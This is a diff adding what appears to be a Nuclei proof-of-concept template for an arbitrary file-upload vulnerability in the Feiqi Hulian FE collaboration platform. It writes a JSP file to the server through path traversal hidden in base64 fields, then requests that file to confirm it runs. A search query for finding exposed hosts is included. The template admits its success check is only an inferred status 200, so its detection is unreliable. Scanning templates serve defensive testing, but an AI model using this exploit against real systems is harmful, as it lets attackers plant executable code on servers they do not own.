@@ -1,0 +1,65 @@
+id: poc-2da4a6506bb87205c7ba
+info:
+  name: 飞企互联FE业务协作平台OfficeServer任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2da4a6506bb87205c7baf785c8f3e4f1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2da4a6506bb87205c7baf785c8f3e4f1
+    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`||`app.name=="飞企互联 FE"`
+http:
+- raw:
+  - 'POST /iweboffice/OfficeServer.js%70 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0.60dabdd3d70bcd96
+
+    Content-Length: 185
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Accept-Encoding: gzip, deflate
+
+
+    DBSTEP V3.0     93                     0        28              DBSTEP=REJTVEVQ
+
+    OPTION=U0FWRUZJTEU=
+
+    RECORDID=Li4vLi4vLi4vamJvc3Mvd2ViL2ZlLndhci91aWQuanNw
+
+    <%out.println("lOKB4C9g");%>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /uid.jsp;.js HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0.60dabdd3d70bcd96
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Cookie: JSESSIONID=C02FFC1F802DE5889538E7D4DA810501'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
